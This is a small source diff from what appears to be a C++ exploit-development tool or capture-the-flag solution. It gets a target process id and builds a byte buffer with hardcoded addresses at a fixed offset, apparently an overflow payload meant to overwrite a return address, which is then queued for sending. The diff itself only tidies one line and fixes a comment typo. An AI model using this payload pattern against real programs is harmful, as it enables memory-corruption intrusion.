@@ -54,7 +54,7 @@ wmain()
                 [0]            -> u32
 
             */
-            u32 pid                        = std::get<0>(_).value()[0];
+            u32 pid = Value(_)[0]; // std::get<0>(_).value()[0];
             info(L"pid: {}",pid);
             //attach_debugger(pid);
             char* buffer = (char*)malloc(0x100);
@@ -66,7 +66,7 @@ wmain()
             *(int*)(buffer + 0x20) = 0x0040263C;
             *(int*)(buffer + 0x20 + 4) = 0x0060e000;
             *(int*)(buffer + 0x20 + 8) = 0x0060e000;
-            std::vector<u8> sendbuffer; // user vector<u8> to send null byte.
+            std::vector<u8> sendbuffer; // use vector<u8> to send null byte.
             for ( size_t i = 0; i <0x28+4; i++ )
             {
                 sendbuffer.push_back(buffer[i]);
